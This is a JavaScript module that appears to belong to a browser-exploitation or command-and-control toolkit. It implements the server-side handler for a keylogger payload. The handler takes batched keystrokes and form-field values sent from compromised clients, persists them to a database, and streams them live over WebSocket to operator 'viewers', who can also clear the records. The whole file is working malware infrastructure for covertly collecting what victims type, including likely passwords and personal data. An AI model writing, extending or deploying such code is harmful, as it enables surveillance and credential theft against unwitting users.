/**
 * Server-side keylogger payload handler.
 * Receives batched keystroke entries from the client, persists them to DB,
 * and relays them to connected viewers.
 *
 * Follows the same DB-backed pattern as the spider handler:
 * - `entries` is a DB-backed getter so it always reflects persisted state.
 * - Viewers receive `init` (all entries on connect) and incremental `entries` messages.
 * - Viewers can send `{ type: "clear" }` to wipe all entries.
 */
import { broadcast } from "../ws-utils.js";

/**
 * Initialize per-client keylogger handler state.
 * @param {object} db - The database layer (from db.js)
 * @param {string} clientId - The client's UUID
 * @param {Function} [storeLog] - Optional storeLog for DB-persisted log entries
 * @returns {object} Handler state
 */
export function initState(db, clientId, storeLog = () => {}) {
  const state = {
    viewers: new Set(),
    clientId,
    db,
    storeLog,
  };
  // Expose entries as a DB-backed getter — always reflects persisted data
  Object.defineProperty(state, "entries", {
    get() {
      return db.getKeyloggerEntries(clientId);
    },
    enumerable: true,
  });
  return state;
}

/**
 * Handle incoming messages from the client.
 * Expects `{ type: "entries", entries: [...] }` with batched keystroke data.
 * @param {object} state - Per-client handler state from initState()
 * @param {object} data - Parsed message from the client
 * @param {Function} pushToViewers - Callback to broadcast full state to all viewers
 */
export function onMessage(state, data, _pushToViewers) {
  if (data.type === "entries") {
    const entries = Array.isArray(data.entries) ? data.entries : [];
    if (entries.length === 0) return;

    for (const entry of entries) {
      state.db.insertKeyloggerEntry(
        state.clientId,
        entry.elementDescriptor || "",
        entry.elementType || "",
        entry.eventType || "input",
        entry.data || "",
        entry.value || "",
        entry.timestamp || Date.now()
      );
    }

    // Forward the new entries as-received to any connected viewers
    if (state.viewers.size > 0) {
      broadcast(state.viewers, JSON.stringify({ type: "entries", entries }));
    }
  }
}

/**
 * Called when a viewer WebSocket connects.
 * Sends all persisted entries as `init`, and listens for `clear` commands.
 * @param {object} state - Per-client handler state from initState()
 * @param {import("ws").WebSocket} ws - The viewer WebSocket
 */
export function onViewerConnect(state, ws) {
  state.viewers.add(ws);
  ws.send(JSON.stringify({ type: "init", entries: state.entries }));

  ws.on("message", (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch {
      return;
    }
    if (msg.type === "clear") {
      state.db.clearKeyloggerEntries(state.clientId);
      broadcast(state.viewers, JSON.stringify({ type: "cleared" }));
    }
  });

  ws.on("close", () => state.viewers.delete(ws));
}

/**
 * Broadcast all persisted entries to all connected viewers.
 * @param {object} state - Per-client handler state from initState()
 */
export function pushToAllViewers(state) {
  if (state.viewers.size === 0) return;
  broadcast(state.viewers, JSON.stringify({ type: "entries", entries: state.entries }));
}

/**
 * Called when the client WebSocket closes.
 * Notifies connected viewers that the client stream has ended.
 * @param {object} state - Per-client handler state from initState()
 */
export function onDisconnect(state) {
  if (state.viewers.size === 0) return;
  broadcast(state.viewers, JSON.stringify({ type: "disconnected" }));
}
